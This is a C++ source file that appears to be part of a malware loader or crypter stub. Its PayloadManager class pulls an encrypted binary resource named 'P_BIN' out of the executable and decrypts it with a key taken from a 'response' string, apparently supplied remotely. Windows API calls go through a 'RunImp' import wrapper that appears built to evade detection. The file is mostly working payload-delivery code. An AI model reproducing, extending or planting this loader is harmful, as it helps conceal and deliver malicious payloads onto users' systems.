#include "pch.h"

#include "resource.h"
#include "PayloadManager.hpp"
#include "Cryptography.hpp"

PayloadManager::PayloadManager() {
    this->rawData = this->LoadRawData();
}

pair<BYTE*, DWORD> PayloadManager::LoadRawData() {
    RunImp* dImp = RunImp::GetInstance();

    HMODULE m_hInstance = dImp->dGetModuleHandleA(NULL);
    HRSRC hResource = FindResource(m_hInstance, MAKEINTRESOURCE(IDR_P_BIN1), "P_BIN");

    if (!hResource) {
        return make_pair(nullptr, 0x0);
    }

    HGLOBAL hLoadedResource = LoadResource(m_hInstance, hResource);

    if (!hLoadedResource) {
        return make_pair(nullptr, 0x0);
    }

    LPVOID pLockedResource = LockResource(hLoadedResource);

    if (!pLockedResource) {
        return make_pair(nullptr, 0x0);
    }

    DWORD dwResourceSize = SizeofResource(m_hInstance, hResource);

    if (!dwResourceSize) {
        return make_pair(nullptr, 0x0);
    }

    return make_pair((BYTE*)pLockedResource, dwResourceSize);
}

pair<BYTE*, DWORD> PayloadManager::GetDecryptedPayload(string response) {
    DecryptKey key = Cryptography::GetKeyFromResponse(response);
    Cryptography c(key);

    BYTE* decrypted = new BYTE[this->rawData.second]();
    c.Decrypt(this->rawData.first, this->rawData.second, decrypted);

    return make_pair(decrypted, this->rawData.second);
}